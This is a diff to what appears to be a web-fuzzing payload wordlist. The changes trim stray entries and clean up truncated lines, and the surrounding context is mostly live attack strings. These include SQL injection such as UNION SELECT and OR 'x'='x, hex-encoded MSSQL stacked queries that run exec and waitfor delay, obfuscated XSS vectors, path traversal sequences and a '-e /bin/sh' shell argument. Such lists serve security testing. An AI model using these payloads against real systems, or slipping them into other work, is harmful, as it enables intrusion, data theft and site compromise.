@@ -1288,7 +1288,6 @@ $_=document,$__=$_.URL,$___=unescape,$_=$_.body,$_.innerHTML%20=%20$___(http=$__
 -1%20UNION%20SELECT%201%20INTO%20@,@,@
 -1' UNION SELECT 1,2,3--+
 -1'%20UNION%20SELECT%201,2,3--+
--2
 -e /bin/sh
 -e%20/bin/sh
 ../../../../../
@@ -1580,7 +1579,6 @@ $_=document,$__=$_.URL,$___=unescape,$_=$_.body,$_.innerHTML%20=%20$___(http=$__
 </XSS STYLE=xss:expression(alert('XSS'))>
 </XSS%20STYLE=xss:expression(alert('XSS'))>
 </XSS/*-*/STYLE=xss:e/**/xpression(alert('XSS'))>
-</body>
 </br style=a:expression(alert())>
 </br%20style=a:expression(alert())>
 </font>/<svg><style>{src&#x3A;'<style/onload=this.onload=confirm(1)>'</font>/</style>
@@ -3621,7 +3619,6 @@ BENCHMARK(
 C:\Users
 C:\Windows
 CLICKME</math>
-CONCAT
 CONVERT(INT,(UNION
 DOCTYPE root
 DOCTYPE%20root
@@ -3980,7 +3977,6 @@ anything' OR 'x'='x
 anything'%20OR%20'x'='x
 anythinglr00%3c%2fscript%3e%3cscript%3ealert(document.domain)%3c%2fscript%3euxldz
 anythinglr00</script><script>alert(document.domain)</script>uxldz
-asc
 b=\"URL(\\"\";
 b=top,a=/loc/ . source,a+=/ation/ . source,b[a=a] = name
 b=top,a=/loc/%20.%20source,a+=/ation/%20.%20source,b[a=a]%20=%20name
@@ -4019,29 +4015,30 @@ curl%20http
 d=0||'une'+'scape'||0;a=0||'ev'+'al'||0;b=0||'locatio';b+=0||'n'||0;c=b[a];d=c(d);c(d(c(b)))
 d=\"alert('XSS');\\")\";
 data:text/html;charset=utf-7;base64,Ij48L3RpdGxlPjxzY3JpcHQ+YWxlcnQoMTMzNyk8L3NjcmlwdD4=
-declare
-declare @q nvarchar (200) 0x730065006c00650063 ...
+declare @
+declare%20@
+declare @q nvarchar (200) 0x730065006c00650063
 declare @q nvarchar (200) 0x730065006c00650063007400200040004000760065007200730069006f006e00 exec(@q)
-declare @q nvarchar (200) select @q = 0x770061 ...
+declare @q nvarchar (200) select @q = 0x770061
 declare @q nvarchar (200) select @q = 0x770061006900740066006F0072002000640065006C00610079002000270030003A0030003A0031003000270000 exec(@q)
 declare @q nvarchar (4000) select @q =
-declare @s varchar (200) select @s = 0x73656c6 ...
+declare @s varchar (200) select @s = 0x73656c6
 declare @s varchar (200) select @s = 0x73656c65637420404076657273696f6e exec(@s)
-declare @s varchar (8000) select @s = 0x73656c ...
+declare @s varchar (8000) select @s = 0x73656c
 declare @s varchar (8000) select @s = 0x73656c65637420404076657273696f6e
-declare @s varchar(200) select @s = 0x77616974 ...
+declare @s varchar(200) select @s = 0x77616974
 declare @s varchar(200) select @s = 0x77616974666F722064656C61792027303A303A31302700 exec(@s) 
 declare @s varchar(22) select @s =
-declare%20@q%20nvarchar%20(200)%200x730065006c00650063%20...
+declare%20@q%20nvarchar%20(200)%200x730065006c00650063%20
 declare%20@q%20nvarchar%20(200)%200x730065006c00650063007400200040004000760065007200730069006f006e00%20exec(@q)
-declare%20@q%20nvarchar%20(200)%20select%20@q%20=%200x770061%20...
+declare%20@q%20nvarchar%20(200)%20select%20@q%20=%200x770061%20
 declare%20@q%20nvarchar%20(200)%20select%20@q%20=%200x770061006900740066006F0072002000640065006C00610079002000270030003A0030003A0031003000270000%20exec(@q)
 declare%20@q%20nvarchar%20(4000)%20select%20@q%20=
-declare%20@s%20varchar%20(200)%20select%20@s%20=%200x73656c6%20...
+declare%20@s%20varchar%20(200)%20select%20@s%20=%200x73656c6%20
 declare%20@s%20varchar%20(200)%20select%20@s%20=%200x73656c65637420404076657273696f6e%20exec(@s)
-declare%20@s%20varchar%20(8000)%20select%20@s%20=%200x73656c%20...
+declare%20@s%20varchar%20(8000)%20select%20@s%20=%200x73656c%20
 declare%20@s%20varchar%20(8000)%20select%20@s%20=%200x73656c65637420404076657273696f6e
-declare%20@s%20varchar(200)%20select%20@s%20=%200x77616974%20...
+declare%20@s%20varchar(200)%20select%20@s%20=%200x77616974%20
 declare%20@s%20varchar(200)%20select%20@s%20=%200x77616974666F722064656C61792027303A303A31302700%20exec(@s)%20
 declare%20@s%20varchar(22)%20select%20@s%20=
 dir C:\
